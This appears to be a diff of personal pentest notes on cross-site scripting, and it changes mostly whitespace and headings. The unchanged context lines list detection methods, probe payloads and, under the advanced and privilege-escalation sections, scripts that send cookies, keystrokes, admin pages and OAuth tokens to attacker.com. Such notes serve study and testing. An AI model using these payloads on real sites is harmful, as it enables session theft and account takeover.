@@ -6,18 +6,15 @@ tags:
   - w
 ---
 
-
 ```table-of-contents
 ```
 
-
-
 # What
+
 [_Cross-Site Scripting_](https://owasp.org/www-community/attacks/xss/) (XSS) is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.
 
-
-
 # Types
+
 Two major classes:
 
 - **Stored**
@@ -33,11 +30,10 @@ Two major classes:
 
 Either of these two vulnerability variants can manifest as client- (browser) or server-side; they can also be _DOM-based_.
 
-
-
 # Identifying XSS Vulnerabilities
 
 ## Detection Methodology:
+
   - Input Vector Mapping:
      * URL parameters (?search=test)
      * Form fields (comments, profile fields)
@@ -49,8 +45,8 @@ Either of these two vulnerability variants can manifest as client- (browser) or 
      * SVG: `<svg onload=alert(1)>`
      * MathML: `<math><maction actiontype="statusline#alert(1)">`
 
-
 ## Context Analysis:
+
 - HTML Context:
      `<div>USER_INPUT</div> → </div><script>alert(1)</script>
    
@@ -60,8 +56,8 @@ Either of these two vulnerability variants can manifest as client- (browser) or 
 - JavaScript Context:
      `<script>var name = 'USER_INPUT';</script> → ';alert(1);//`
 
-
 ## Tools:
+
    - Manual Testing: Browser DevTools (Elements/Console tabs)
    - Automated: 
      * Burp Scanner
@@ -69,13 +65,12 @@ Either of these two vulnerability variants can manifest as client- (browser) or 
      * XSStrike: `python3 xsstrike.py -u "https://site.com/search?q=test"`
      * Caido
 
-
-
 # BASIC XSS EXPLOITATION
 
 ## Reflected XSS:
 
 ### URL Based
+
 ```
 https://vuln-site.com/search?q=<script>alert(document.domain)</script>
 ```
@@ -86,10 +81,10 @@ Where the exploit is encoded to get past filtering
 %3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
 ```
 
-
-## Stored XSS in web pages
+## Stored XSS in Web Pages
 
 ### Profile Field:
+
 ```html
 ## Stored as an image
 <img src=x onerror=alert(localStorage.getItem('token'))>
@@ -98,8 +93,8 @@ Where the exploit is encoded to get past filtering
 <iframe src="javascript:alert(`Stored XSS`)">
 ```
 
-
 ## DOM Sinks
+
 JavaScript functions/properties that unsafely handle user input.
 
 ```html
@@ -117,8 +112,8 @@ https://site.com#input=<img src=1 onerror=alert(1)>
 ## The script above reads that, and writes this into the DOM without any sanitization
 ```
 
-
 ## Advanced Payloads
+
 ```html
 ## Session Hijacking:
 <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
@@ -129,11 +124,10 @@ document.addEventListener('keypress',e=>fetch('https://attacker.com/log?k='+e.ke
 </input>
 ```
 
-
-
 # PRIVILEGE ESCALATION VIA XSS
 
 ## Admin Interface Targeting:
+
 ```html
 ## CSRF Token Theft:
 <script>
@@ -141,8 +135,8 @@ fetch('/admin').then(r=>r.text()).then(d=>fetch('https://attacker.com/exfil?page
 </script>
 ```
 
-
 ## Account Takeover Chains:
+
 ```html
 ##Password Change Exploit:
 <script>
@@ -153,9 +147,8 @@ fetch('/admin').then(r=>r.text()).then(d=>fetch('https://attacker.com/exfil?page
 </script>
 ```
 
-
-
 # API Abuse:
+
 ```html
 # Role Modification:
      <script>
@@ -167,9 +160,8 @@ fetch('/admin').then(r=>r.text()).then(d=>fetch('https://attacker.com/exfil?page
      </script>
 ``` 
 
-
-
 # Real-World Example:
+
 ```html
 #Stealing OAuth Tokens:
  <img src=x onerror="
@@ -183,9 +175,8 @@ fetch('/admin').then(r=>r.text()).then(d=>fetch('https://attacker.com/exfil?page
        document.body.appendChild(iframe);">
 ```
 
-
-
 # Flowchart
+
 ```mermaid
 flowchart TD
 
